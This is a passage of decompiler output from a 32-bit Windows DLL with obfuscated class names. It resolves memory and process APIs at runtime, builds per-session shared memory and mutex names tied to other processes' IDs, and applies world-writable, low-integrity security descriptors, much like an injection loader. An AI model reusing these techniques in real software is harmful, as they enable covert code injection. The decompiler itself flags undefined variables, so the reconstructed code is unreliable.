  _DWORD v16[7]; // [esp+10h] [ebp-1Ch] BYREF

  v16[3] = 0;
  v16[6] = 1;
  if ( !*(_BYTE *)(a1 + 40) )
  {
    sub_1002EB5F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVBhkofbHwqNblcfnVsjwbhkof_gfjjefwq_sr__);
  }
  v14 = sub_1001B3A0(a1, pExceptionObject);
  if ( !v14 )
  {
    sub_100167F9(v16, 1);
    _CxxThrowException(v16, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  (*(void (__thiscall **)(int, int, int, int, _DWORD, int))(*(_DWORD *)(a1 + 4) + 56))(a1 + 4, a2, v14, a12, 0, 60000);
  sub_10028854((int)&a4);
  return a2;
}

//----- (1001B3A0) --------------------------------------------------------
int __userpurge sub_1001B3A0@<eax>(int a1@<eax>, int pExceptionObject)
{
  if ( !*(_BYTE *)(a1 + 40) )
  {
    sub_1002EB5F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVBhkofbHwqNblcfnVsjwbhkof_gfjjefwq_sr__);
  }
  return (*(int (__thiscall **)(int, _DWORD, int))(*(_DWORD *)(a1 + 4) + 68))(
           a1 + 4,
           *(_DWORD *)(a1 + 36),
           pExceptionObject);
}

//----- (1001B3D6) --------------------------------------------------------
_DWORD *__stdcall sub_1001B3D6(_DWORD *a1, int a2)
{
  *a1 = off_10093FD8;
  sub_1002271D(a1 + 1, 0, 0);
  sub_10016983(0, (int)(a1 + 4), 0);
  sub_1001B423((int)a1, a2);
  return a1;
}
// 10093FD8: using guessed type int (__thiscall *off_10093FD8[2])(void *Block, char);

//----- (1001B423) --------------------------------------------------------
int __userpurge sub_1001B423@<eax>(int a1@<edi>, int a2)
{
  if ( a1 != a2 )
  {
    *(_BYTE *)(a1 + 40) = *(_BYTE *)(a2 + 40);
    *(_DWORD *)(a1 + 36) = *(_DWORD *)(a2 + 36);
    sub_10013521();
    sub_10016B2F((int *)(a2 + 16), a1 + 16);
  }
  return a1;
}
// 10013521: using guessed type int sub_10013521(void);

//----- (1001B468) --------------------------------------------------------
void __cdecl sub_1001B468(int a1, int a2, int a3, DWORD a4)
{
  unsigned int v4; // esi
  bool v5; // bl
  _DWORD *v6; // eax
  int v7; // ecx
  const wchar_t *v8; // edi
  int v9; // [esp-8h] [ebp-474h] BYREF
  int v10; // [esp-4h] [ebp-470h]
  _DWORD v11[5]; // [esp+10h] [ebp-45Ch] BYREF
  HANDLE v12[4]; // [esp+24h] [ebp-448h] BYREF
  _DWORD v13[2]; // [esp+34h] [ebp-438h] BYREF
  int v14[2]; // [esp+3Ch] [ebp-430h] BYREF
  int pExceptionObject; // [esp+44h] [ebp-428h] BYREF
  wchar_t v16[261]; // [esp+48h] [ebp-424h] BYREF
  wchar_t v17[267]; // [esp+252h] [ebp-21Ah] BYREF
  int v18; // [esp+468h] [ebp-4h]

  pExceptionObject = a1;
  v4 = 0;
  v18 = 0;
  if ( !*(_DWORD *)(*(_DWORD *)(a1 + 4) + 28) )
    goto LABEL_2;
  if ( a4 == -1 )
    a4 = (*(int (__thiscall **)(int *))(a2 + 24))(&a2);
  if ( !sub_1001BA1A(v16, a4) )
  {
LABEL_2:
    sub_10016441(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  sub_1000CC20(v14, v17);
  LOBYTE(v18) = 1;
  v5 = sub_10017637((int)v14) == 0;
  LOBYTE(v18) = 0;
  sub_1000CE59(v14);
  if ( !v5 )
  {
    sub_1000CC20(v14, v17);
    LOBYTE(v18) = 2;
    v6 = sub_1001445F(v13);
    LOBYTE(v18) = 3;
    sub_100174BF((int)v12, 16, (int)v14, 0, *(struct _SECURITY_ATTRIBUTES **)(*v6 + 4));
    LOBYTE(v18) = 5;
    sub_100015D8(v13);
    LOBYTE(v18) = 6;
    sub_1000CE59(v14);
    sub_100171BE((int *)v12, v13);
    LOBYTE(v18) = 7;
    v10 = v7;
    v9 = v7;
    v14[1] = (int)&v9;
    sub_1000CC20(&v9, v16);
    LOBYTE(v18) = 7;
    sub_1002EEB0(v11, 0x5508u, (LPSECURITY_ATTRIBUTES)1, v9, v10);
    LOBYTE(v18) = 9;
    v8 = (const wchar_t *)(v11[4] + 26);
    while ( _wcsicmp(v8, *(const wchar_t **)(*(_DWORD *)(pExceptionObject + 4) + 12)) )
    {
      ++v4;
      v8 += 272;
      if ( v4 >= 0x28 )
      {
        LOBYTE(v18) = 7;
        sub_1002F012(v11);
        LOBYTE(v18) = 6;
        sub_100171F2(v13);
        LOBYTE(v18) = 0;
        sub_100175EC(v12);
        v18 = -1;
        sub_10001FCC(&a2);
        goto LABEL_12;
      }
    }
    LOBYTE(v18) = 7;
    sub_1002F012(v11);
    LOBYTE(v18) = 6;
    sub_100171F2(v13);
    LOBYTE(v18) = 0;
    sub_100175EC(v12);
  }
  v18 = -1;
  sub_10001FCC(&a2);
LABEL_12:
  sub_1006A5A7();
}
// 1001B599: variable 'v7' is possibly undefined
// 1001B468: using guessed type wchar_t var_424[261];
// 1001B468: using guessed type wchar_t var_21A[267];
// 1001B468: using guessed type _DWORD var_438[2];
// 1001B468: using guessed type HANDLE var_448[4];

//----- (1001B67C) --------------------------------------------------------
bool __cdecl sub_1001B67C(int a1, int a2)
{
  int v2; // eax
  bool v3; // bl
  int v5[10]; // [esp+0h] [ebp-2Ch] BYREF
  int v6; // [esp+28h] [ebp-4h]

  v6 = 0;
  v5[7] = (int)v5;
  sub_1000FF31((int)&a2, v5);
  LOBYTE(v6) = 0;
  sub_1001B468(a1, v5[0], v5[1], v5[2]);
  v3 = v2 != 0;
  v6 = -1;
  sub_10001FCC(&a2);
  return v3;
}
// 1001B6B2: variable 'v2' is possibly undefined

//----- (1001B6C9) --------------------------------------------------------
int __stdcall sub_1001B6C9(int a1)
{
  *(_DWORD *)a1 = off_10093FD8;
  sub_1002271D((_DWORD *)(a1 + 4), 0, 0);
  sub_10016983(0, a1 + 16, 0);
  *(_BYTE *)(a1 + 41) = 0;
  return a1;
}
// 10093FD8: using guessed type int (__thiscall *off_10093FD8[2])(void *Block, char);

//----- (1001B711) --------------------------------------------------------
int __cdecl sub_1001B711(int a1, int a2, int a3)
{
  int v3; // eax
  int v5[7]; // [esp+0h] [ebp-30h] BYREF
  int v6; // [esp+1Ch] [ebp-14h]
  int pExceptionObject[3]; // [esp+20h] [ebp-10h] BYREF
  int v8; // [esp+2Ch] [ebp-4h]

  v8 = 0;
  v6 = 0;
  pExceptionObject[0] = (int)v5;
  sub_1000FF31(a2, v5);
  v8 = 0;
  sub_1001B468(a3, v5[0], v5[1], v5[2]);
  pExceptionObject[0] = v3;
  if ( !v3 )
  {
    sub_10016441(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI1_AVSnsziibtx_sr__);
  }
  sub_1001B6C9(a1);
  v8 = 0;
  v6 = 1;
  sub_10013521();
  *(_DWORD *)(a1 + 36) = pExceptionObject[0];
  *(_BYTE *)(a1 + 40) = 1;
  return a1;
}
// 1001B74C: variable 'v3' is possibly undefined
// 10013521: using guessed type int sub_10013521(void);

//----- (1001B793) --------------------------------------------------------
char __usercall sub_1001B793@<al>(int a1@<eax>, int a2@<ecx>, DWORD a3)
{
  *(_DWORD *)(a2 + 1144) = a1;
  if ( !sub_1001B7CA((char **)a2) || !sub_1001BA1A((WCHAR *)(a2 + 96), a3) )
    return 0;
  *(_BYTE *)(a2 + 1140) = 1;
  return 1;
}

//----- (1001B7CA) --------------------------------------------------------
bool __usercall sub_1001B7CA@<al>(char **a1@<esi>)
{
  char *ModuleHandleW; // edi
  char *v3; // ebx
  char *v4; // eax
  char *v5; // eax
  char *v6; // eax
  char *v7; // eax
  char *v8; // eax
  char *v9; // eax
  char *v10; // eax
  char *v11; // eax
  char *v12; // eax
  char *v13; // eax
  char *v14; // eax
  char *v15; // eax
  char *v16; // eax
  char *v17; // eax
  char *v18; // eax
  char *v19; // eax
  char *v20; // eax
  char *v21; // eax
  char *v22; // eax
  char *v23; // eax
  char *v24; // eax
  char *v25; // eax
  char *v26; // eax
  char *v27; // eax

  ModuleHandleW = (char *)GetModuleHandleW(aKernel32Dll_2);
  if ( !ModuleHandleW )
    return 0;
  v3 = (char *)GetModuleHandleW(aNtdllDll_0);
  v4 = sub_1002491F(ModuleHandleW, aVirtualalloc);
  a1[1] = v4;
  if ( !v4 )
    return 0;
  v5 = sub_1002491F(ModuleHandleW, aSleep);
  a1[22] = v5;
  if ( !v5 )
    return 0;
  v6 = sub_1002491F(ModuleHandleW, aVirtualfree_0);
  a1[2] = v6;
  if ( !v6 )
    return 0;
  v7 = sub_1002491F(ModuleHandleW, aVirtualprotect);
  a1[3] = v7;
  if ( !v7 )
    return 0;
  v8 = sub_1002491F(ModuleHandleW, aLoadlibrarya);
  a1[4] = v8;
  if ( !v8 )
    return 0;
  v9 = sub_1002491F(ModuleHandleW, aGetprocaddress);
  a1[7] = v9;
  if ( !v9 )
    return 0;
  v10 = sub_1002491F(ModuleHandleW, aGetmodulehandl);
  a1[6] = v10;
  if ( !v10 )
    return 0;
  v11 = sub_1002491F(v3, aMemcpy);
  a1[8] = v11;
  if ( !v11 )
    return 0;
  v12 = sub_1002491F(v3, aMemset);
  a1[9] = v12;
  if ( !v12 )
    return 0;
  v13 = sub_1002491F(ModuleHandleW, aFreelibrary);
  a1[21] = v13;
  if ( !v13 )
    return 0;
  v14 = sub_1002491F(ModuleHandleW, aOpenmutexw);
  *a1 = v14;
  if ( !v14 )
    return 0;
  v15 = sub_1002491F(ModuleHandleW, aCreatefilemapp);
  a1[10] = v15;
  if ( !v15 )
    return 0;
  v16 = sub_1002491F(ModuleHandleW, aMapviewoffile);
  a1[12] = v16;
  if ( !v16 )
    return 0;
  v17 = sub_1002491F(ModuleHandleW, aUnmapviewoffil_0);
  a1[13] = v17;
  if ( !v17 )
    return 0;
  v18 = sub_1002491F(ModuleHandleW, aCreatemutexw);
  a1[17] = v18;
  if ( !v18 )
    return 0;
  v19 = sub_1002491F(ModuleHandleW, aWaitforsingleo);
  a1[18] = v19;
  if ( !v19 )
    return 0;
  v20 = sub_1002491F(ModuleHandleW, aClosehandle);
  a1[19] = v20;
  if ( !v20 )
    return 0;
  v21 = sub_1002491F(v3, aNtqueryinforma);
  a1[15] = v21;
  if ( !v21 )
    return 0;
  v22 = sub_1002491F(ModuleHandleW, aGetlasterror);
  a1[16] = v22;
  if ( !v22 )
    return 0;
  v23 = sub_1002491F(ModuleHandleW, aReleasemutex);
  a1[14] = v23;
  if ( !v23 )
    return 0;
  v24 = sub_1002491F(ModuleHandleW, aOpenfilemappin);
  a1[11] = v24;
  if ( !v24 )
    return 0;
  v25 = sub_1002491F(ModuleHandleW, aLoadlibraryw);
  a1[5] = v25;
  if ( !v25 )
    return 0;
  v26 = sub_1002491F(ModuleHandleW, aCreatefilew);
  a1[20] = v26;
  if ( !v26 )
    return 0;
  v27 = sub_1002491F(ModuleHandleW, aLocalfree);
  a1[23] = v27;
  return v27 != 0;
}

//----- (1001BA1A) --------------------------------------------------------
bool __cdecl sub_1001BA1A(WCHAR *a1, DWORD dwProcessId)
{
  DWORD CurrentProcessId; // eax
  HANDLE FileMappingW; // eax
  DWORD v5; // [esp+10h] [ebp-428h] BYREF
  int Version; // [esp+14h] [ebp-424h]
  DWORD pSessionId; // [esp+18h] [ebp-420h] BYREF
  WCHAR pszDest[262]; // [esp+1Ch] [ebp-41Ch] BYREF
  WCHAR String1[262]; // [esp+228h] [ebp-210h] BYREF

  pSessionId = 0;
  memset(String1, 0, 522);
  Version = GetVersion();
  if ( !ProcessIdToSessionId(dwProcessId, &pSessionId) )
    return 0;
  if ( Version < 0 )
    return 0;
  if ( (unsigned __int8)Version < 5u )
    return 0;
  CurrentProcessId = GetCurrentProcessId();
  if ( !ProcessIdToSessionId(CurrentProcessId, &v5) )
    return 0;
  memset(pszDest, 0, 522);
  if ( wnsprintfW(pszDest, 522, pszFmt, v5) < 0 )
    return 0;
  FileMappingW = CreateFileMappingW((HANDLE)0xFFFFFFFF, 0, 4u, 0, 1u, pszDest);
  if ( FileMappingW )
  {
    CloseHandle(FileMappingW);
    if ( wnsprintfW(String1, 522, aSessionD, pSessionId) < 0 )
      return 0;
  }
  else if ( GetLastError() != 3 || !lstrcpynW(String1, String2, 522) )
  {
    return 0;
  }
  if ( wnsprintfW(a1, 522, aSThPoolShdMtxF, String1, dwProcessId) < 0 )
    return 0;
  return wnsprintfW(a1 + 261, 522, aSThPoolShdPqoi, String1, dwProcessId) >= 0;
}

//----- (1001BBA7) --------------------------------------------------------
char __usercall sub_1001BBA7@<al>(int a1@<eax>, int a2@<ecx>, DWORD a3)
{
  LPWSTR v5; // eax
  WCHAR *v6; // edi
  UINT SystemDirectoryW; // eax
  signed int Version; // [esp+8h] [ebp-8h]

  *(_DWORD *)(a2 + 2320) = 0;
  *(_DWORD *)(a2 + 2332) = a1;
  Version = GetVersion();
  if ( !sub_1001B7CA((char **)a2) || !sub_1001BA1A((WCHAR *)(a2 + 96), a3) )
    return 0;
  if ( !lstrcpynW((LPWSTR)(a2 + 1274), aMsvcrtDll, 261) )
    return 0;
  if ( !lstrcpynA((LPSTR)(a2 + 1140), aAdvapi32Dll_0, 13) || !lstrcpynA((LPSTR)(a2 + 1153), aConvertstrings_1, 53) )
    return 0;
  v5 = (unsigned __int8)Version == 6
     ? lstrcpynW((LPWSTR)(a2 + 1206), L"S:(ML;;NW;;;LW)D:(A;OICI;GA;;;WD)", 34)
     : lstrcpynW((LPWSTR)(a2 + 1206), L"D:(A;OICI;GA;;;WD)", 34);
  if ( !v5 || Version < 0 || (unsigned __int8)Version < 5u )
    return 0;
  if ( (unsigned __int8)Version != 5 || BYTE1(Version) )
  {
    v6 = (WCHAR *)(a2 + 2338);
    *(_BYTE *)(a2 + 2336) = 1;
    SystemDirectoryW = GetSystemDirectoryW((LPWSTR)(a2 + 2338), 0x104u);
    if ( SystemDirectoryW )
    {
      if ( *(_WORD *)(a2 + 2 * SystemDirectoryW + 2336) != 92 )
        lstrcatW(v6, asc_100B7B8C);
      lstrcatW(v6, aShell32Dll);
      return 1;
    }
    return 0;
  }
  *(_BYTE *)(a2 + 2336) = 0;
  return 1;
}
// 10092E24: using guessed type wchar_t aDAOiciGaWd_0[19];

//----- (1001BDF4) --------------------------------------------------------
_DWORD *__usercall sub_1001BDF4@<eax>(_DWORD *a1@<esi>)
{
  _DWORD *v1; // eax

  v1 = operator new(4u);
  if ( v1 )
    *v1 = 1;
  else
    v1 = 0;
  *a1 = 0;
  a1[1] = v1;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001BE2F) --------------------------------------------------------
void __thiscall sub_1001BE2F(void *this)
{
  sub_1001BF49((int)this);
}

//----- (1001BE5A) --------------------------------------------------------
void __usercall sub_1001BE5A(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *v3; // eax

  if ( *a1 != a2 )
  {
    sub_1001BF49((int)a1);
    v3 = operator new(4u);
    if ( v3 )
      *v3 = 1;
    else
      v3 = 0;
    a1[1] = v3;
    *a1 = a2;
  }
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001BEA0) --------------------------------------------------------
_DWORD *__usercall sub_1001BEA0@<eax>(_DWORD *a1@<esi>)
{
  _DWORD *v1; // eax

  v1 = operator new(4u);
  if ( v1 )
    *v1 = 1;
  else
    v1 = 0;
  *a1 = 0;
  a1[1] = v1;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001BEDB) --------------------------------------------------------
void __thiscall sub_1001BEDB(void *this)
{
  sub_1001BF71((int)this);
}

//----- (1001BF06) --------------------------------------------------------
void __usercall sub_1001BF06(_DWORD *a1@<ecx>, int a2@<edi>)
{
  _DWORD *v3; // eax

  if ( *a1 != a2 )
  {
    sub_1001BF71((int)a1);
    v3 = operator new(4u);
    if ( v3 )
      *v3 = 1;
    else
      v3 = 0;
    a1[1] = v3;
    *a1 = a2;
  }
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1001BF49) --------------------------------------------------------
void __usercall sub_1001BF49(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1001BF71) --------------------------------------------------------
void __usercall sub_1001BF71(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1001BF99) --------------------------------------------------------
_DWORD *__stdcall sub_1001BF99(_DWORD *a1)
{
  sub_100148B1(a1);
  *a1 = &off_10093FEC;
  sub_1000CC20(a1 + 1, word_100B78B0);
  return a1;
}
// 10093FEC: using guessed type int (__thiscall *off_10093FEC)(void *Block, char);
// 100B78B0: using guessed type wchar_t word_100B78B0[2];

//----- (1001BFD4) --------------------------------------------------------
int *__thiscall sub_1001BFD4(int *Block, char a2)
{
  sub_1001BFF3(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001BFF3) --------------------------------------------------------
void __thiscall sub_1001BFF3(int *this)
{
  *this = (int)&off_10093FEC;
  sub_1000CE59(this + 1);
  sub_100148FB(this);
}
// 10093FEC: using guessed type int (__thiscall *off_10093FEC)(void *Block, char);

//----- (1001C027) --------------------------------------------------------
int sub_1001C027()
{
  return 41;
}

//----- (1001C02B) --------------------------------------------------------
LONG __thiscall sub_1001C02B(int *this, int *a2)
{
  int *v2; // eax
  _DWORD *v3; // esi
  int v4; // ecx
  int v5; // eax
  int v7; // [esp-8h] [ebp-3Ch] BYREF
  int v8; // [esp-4h] [ebp-38h]
  int v9[2]; // [esp+10h] [ebp-24h] BYREF
  int v10; // [esp+18h] [ebp-1Ch] BYREF
  int v11; // [esp+1Ch] [ebp-18h] BYREF
  int *v12; // [esp+20h] [ebp-14h]
  int v13; // [esp+30h] [ebp-4h]

  v12 = this;
  sub_1000CE26(&v10, (int)&unk_100BF738);
  v13 = 1;
  v2 = sub_10014BF7(v9);
  LOBYTE(v13) = 2;
  sub_10002C25(v2 + 1, &v11);
  LOBYTE(v13) = 1;
  sub_1000CE59(v9);
  v13 = 0;
  v3 = v12 + 1;
  if ( sub_1000D0B5((int)(v12 + 1), (int)&v10) )
  {
    v8 = v4;
    v7 = v4;
    v12 = &v7;
    sub_1000CE26(&v7, (int)&v10);
    LOBYTE(v13) = 4;
    v5 = *a2;
    LOBYTE(v13) = 0;
    (*(void (__thiscall **)(int *, int, int))(v5 + 72))(a2, v7, v8);
  }
  sub_10002C25(&v11, v3 + 1);
  v13 = -1;
  return sub_1000CE59(&v10);
}
// 1001C08D: variable 'v4' is possibly undefined

//----- (1001C0D7) --------------------------------------------------------
_DWORD *__stdcall sub_1001C0D7(_DWORD *a1)
{
  _DWORD *v1; // edx

  sub_100148B1(a1);
  *v1 = &off_10093FFC;
  return v1;
}
// 1001C0F0: variable 'v1' is possibly undefined
// 10093FFC: using guessed type int (__thiscall *off_10093FFC)(void *Block, char);

//----- (1001C104) --------------------------------------------------------
_DWORD *__thiscall sub_1001C104(_DWORD *Block, char a2)
{
  sub_1001C123(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001C123) --------------------------------------------------------
void __thiscall sub_1001C123(_DWORD *this)
{
  *this = &off_10093FFC;
  sub_100148FB(this);
}
// 10093FFC: using guessed type int (__thiscall *off_10093FFC)(void *Block, char);

//----- (1001C147) --------------------------------------------------------
int sub_1001C147()
{
  return 44;
}

//----- (1001C14B) --------------------------------------------------------
int __stdcall sub_1001C14B(int *a1)
{
  int v1; // eax
  _DWORD v3[9]; // [esp-14h] [ebp-58h] BYREF
  struct _SYSTEMTIME SystemTime; // [esp+10h] [ebp-34h] BYREF
  _DWORD pExceptionObject[3]; // [esp+20h] [ebp-24h] BYREF
  struct _FILETIME FileTime; // [esp+2Ch] [ebp-18h] BYREF
  _DWORD *v7; // [esp+34h] [ebp-10h]
  int v8; // [esp+40h] [ebp-4h]

  memset(&SystemTime, 0, sizeof(SystemTime));
  memset(&FileTime, 0, sizeof(FileTime));
  GetSystemTime(&SystemTime);
  if ( !SystemTimeToFileTime(&SystemTime, &FileTime) )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  v7 = v3;
  sub_10016983((void *)8, (int)v3, &FileTime);
  v8 = 0;
  v1 = *a1;
  v8 = -1;
  return (*(int (__thiscall **)(int *, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))(v1 + 76))(
           a1,
           v3[0],
           v3[1],
           v3[2],
           v3[3],
           v3[4]);
}
// 1001C14B: using guessed type _DWORD pExceptionObject[3];

//----- (1001C1DC) --------------------------------------------------------
_DWORD *__stdcall sub_1001C1DC(_DWORD *a1)
{
  sub_100148B1(a1);
  *a1 = &off_1009400C;
  sub_1000CC20(a1 + 1, word_100B780C);
  return a1;
}
// 1009400C: using guessed type int (__thiscall *off_1009400C)(void *Block, char);
// 100B780C: using guessed type wchar_t word_100B780C[2];

//----- (1001C217) --------------------------------------------------------
int *__thiscall sub_1001C217(int *Block, char a2)
{
  sub_1001C236(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001C236) --------------------------------------------------------
void __thiscall sub_1001C236(int *this)
{
  *this = (int)&off_1009400C;
  sub_1000CE59(this + 1);
  sub_100148FB(this);
}
// 1009400C: using guessed type int (__thiscall *off_1009400C)(void *Block, char);

//----- (1001C26A) --------------------------------------------------------
int sub_1001C26A()
{
  return 40;
}

//----- (1001C26E) --------------------------------------------------------
LONG __thiscall sub_1001C26E(int *this, int *a2)
{
  _DWORD *v2; // eax
  int v3; // eax
  _DWORD *v4; // esi
  int v5; // ecx
  int v6; // eax
  int v8; // [esp-8h] [ebp-48h] BYREF
  int v9; // [esp-4h] [ebp-44h]
  int v10[3]; // [esp+10h] [ebp-30h] BYREF
  int v11[2]; // [esp+1Ch] [ebp-24h] BYREF
  int v12; // [esp+24h] [ebp-1Ch] BYREF
  int v13; // [esp+28h] [ebp-18h] BYREF
  int *v14; // [esp+2Ch] [ebp-14h]
  int v15; // [esp+3Ch] [ebp-4h]

  v14 = this;
  sub_1000CE26(&v12, (int)&unk_100BF740);
  v15 = 1;
  v2 = sub_10014B92(v10);
  LOBYTE(v15) = 2;
  v3 = (*(int (__thiscall **)(_DWORD *, int *))(*v2 + 72))(v2, v11);
  LOBYTE(v15) = 3;
  sub_10002C25((int *)(v3 + 4), &v13);
  LOBYTE(v15) = 2;
  sub_1000CE59(v11);
  LOBYTE(v15) = 1;
  sub_10001FCC(v10);
  v15 = 0;
  v4 = v14 + 1;
  if ( sub_1000D0B5((int)(v14 + 1), (int)&v12) )
  {
    v9 = v5;
    v8 = v5;
    v14 = &v8;
    sub_1000CE26(&v8, (int)&v12);
    LOBYTE(v15) = 5;
    v6 = *a2;
    LOBYTE(v15) = 0;
    (*(void (__thiscall **)(int *, int, int))(v6 + 72))(a2, v8, v9);
  }
  sub_10002C25(&v13, v4 + 1);
  v15 = -1;
  return sub_1000CE59(&v12);
}
// 1001C2EC: variable 'v5' is possibly undefined
// 1001C26E: using guessed type int var_30[3];

//----- (1001C336) --------------------------------------------------------
int __userpurge sub_1001C336@<eax>(
        _DWORD *a1@<ebx>,
        int a2,
        int a3,
        volatile LONG *lpAddend,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        volatile LONG *a10,
        int a11,
        int a12)
{
  int v12; // ecx
  int v13; // ecx
  volatile LONG *v15; // [esp-4h] [ebp-20h]
  volatile LONG *v16; // [esp-4h] [ebp-20h]

  v12 = a3;
  v15 = lpAddend;
  *(_DWORD *)(a2 + 4) = lpAddend;
  *(_DWORD *)a2 = v12;
  InterlockedIncrement(v15);
  sub_100141F3((int *)(a2 + 8), (int)&a5);
  v13 = a9;
  *(_DWORD *)(a2 + 20) = a8;
  v16 = a10;
  *(_DWORD *)(a2 + 28) = a10;
  *(_DWORD *)(a2 + 24) = v13;
  InterlockedIncrement(v16);
  *(_DWORD *)(a2 + 32) = a11;
  *(_DWORD *)(a2 + 40) = a12;
  *(_BYTE *)(a2 + 36) = 1;
  sub_10016AE9(a1, a2 + 44);
  (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(a2 + 24) + 8))(*(_DWORD *)(a2 + 24));
  sub_10006A25(&a3);
  sub_100141CF(&a5);
  sub_10003B09(&a9);
  return a2;
}

//----- (1001C3E1) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
void __stdcall sub_1001C3E1(_DWORD *a1)
{
  int v1; // eax
  int v2; // eax
  bool v3; // bl
  volatile LONG *v4; // ecx
  int v5[6]; // [esp-28h] [ebp-E4h] BYREF
  volatile LONG *v6; // [esp-10h] [ebp-CCh] BYREF
  volatile LONG *v7; // [esp-Ch] [ebp-C8h]
  char v8[48]; // [esp+10h] [ebp-ACh] BYREF
  int v9[9]; // [esp+40h] [ebp-7Ch] BYREF
  _DWORD v10[6]; // [esp+64h] [ebp-58h] BYREF
  _DWORD v11[4]; // [esp+7Ch] [ebp-40h] BYREF
  char v12[8]; // [esp+8Ch] [ebp-30h] BYREF
  int v13; // [esp+94h] [ebp-28h]
  int *v14; // [esp+A0h] [ebp-1Ch]
  int v15; // [esp+A4h] [ebp-18h]
  int v16; // [esp+B8h] [ebp-4h]

  v15 = a1[5];
  if ( *((_BYTE *)a1 + 36) )
  {
    v16 = 0;
    sub_10017D60(v9);
    LOBYTE(v16) = 1;
    sub_10021E1C((int)v8, (int)v9, a1[10]);
    LOBYTE(v16) = 2;
    (*(void (__thiscall **)(_DWORD, char *))(*(_DWORD *)*a1 + 4))(*a1, v8);
    sub_10022413(v8);
    v2 = (*(int (__thiscall **)(_DWORD))(*(_DWORD *)a1[6] + 20))(a1[6]);
    v3 = !sub_10020CD2(v2);
    v7 = v4;
    v6 = v4;
    v14 = (int *)&v6;
    sub_10006A5E(a1 + 6, &v6);
    LOBYTE(v16) = 2;
    sub_10022209((int)v12, (int)v6, v7);
    LOBYTE(v16) = 4;
    if ( v3 )
      (*(void (__thiscall **)(int, _DWORD *))(*(_DWORD *)v13 + 56))(v13, a1 + 11);
    sub_10022561(v10, (int)v12, a1[8]);
    LOBYTE(v16) = 5;
    sub_1001CC48(v11, (int)v10, 1);
    LOBYTE(v16) = 6;
    (*(void (__thiscall **)(int, _DWORD, int))(*(_DWORD *)v13 + 64))(v13, 0, 2);
    LOBYTE(v16) = 7;
    v14 = v5;
    sub_10017EAF(v9, (int)v5);
    LOBYTE(v16) = 7;
    sub_1001CDCD(v11, v5[0], v5[1], v5[2], v5[3], v5[4]);
    v16 = 5;
    sub_1001CC9A(v11);
    LOBYTE(v16) = 4;
    sub_100225BC(v10);
    LOBYTE(v16) = 2;
    sub_10022277(v12);
    LOBYTE(v16) = 1;
    sub_10021E6F((int)v8);
    LOBYTE(v16) = 0;
    sub_10017DC3((int)v9);
    v16 = -1;
  }
  else
  {
    v15 = 10000;
    v1 = (*(int (__thiscall **)(_DWORD))(*(_DWORD *)a1[6] + 20))(a1[6]);
    if ( !sub_10020CD2(v1) )
      *((_BYTE *)a1 + 36) = 1;
  }
  v16 = 11;
  sub_10014E23((int)(a1 + 2), v15, 0);
}
// 1001C5A5: positive sp value 4 has been found
// 1001C47C: variable 'v4' is possibly undefined
// 1001C3E1: using guessed type int var_7C[9];
// 1001C3E1: using guessed type _DWORD var_58[6];
// 1001C3E1: using guessed type _DWORD var_40[4];

//----- (1001C5B0) --------------------------------------------------------
int __stdcall sub_1001C5B0(int a1)
{
  bool v1; // al

  *(_DWORD *)a1 = &off_10094DC4;
  *(_DWORD *)a1 = &off_10094024;
  v1 = sub_1002F0F1();
  *(_BYTE *)(a1 + 4) = v1;
  if ( v1 )
    InterlockedIncrement(&Addend);
  return a1;
}
// 10094024: using guessed type int (__thiscall *off_10094024)(void *Block, char);
// 10094DC4: using guessed type int (__thiscall *off_10094DC4)(void *Block, char);

//----- (1001C60B) --------------------------------------------------------
_BYTE *__thiscall sub_1001C60B(_BYTE *Block, char a2)
{
  sub_1001C62A(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001C62A) --------------------------------------------------------
void __thiscall sub_1001C62A(_BYTE *this)
{
  *(_DWORD *)this = &off_10094024;
  InterlockedDecrement(&Addend);
  if ( this[4] && !Addend )
    sub_1003596C();
  *(_DWORD *)this = &off_10094DC4;
}
// 10094024: using guessed type int (__thiscall *off_10094024)(void *Block, char);
// 10094DC4: using guessed type int (__thiscall *off_10094DC4)(void *Block, char);

//----- (1001C689) --------------------------------------------------------
int __thiscall sub_1001C689(_BYTE *this, int a2, _DWORD *a3)
{
  _DWORD pExceptionObject[6]; // [esp+14h] [ebp-18h] BYREF

  sub_10016983(0, a2, 0);
  pExceptionObject[1] = 1;
  pExceptionObject[5] = 1;
  if ( !this[4] )
  {
    sub_1002F278(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVOzxflwtlqlhGovvrdoxa_oqymxuuz_sr__);
  }
  sub_1002F115(a2, a3);
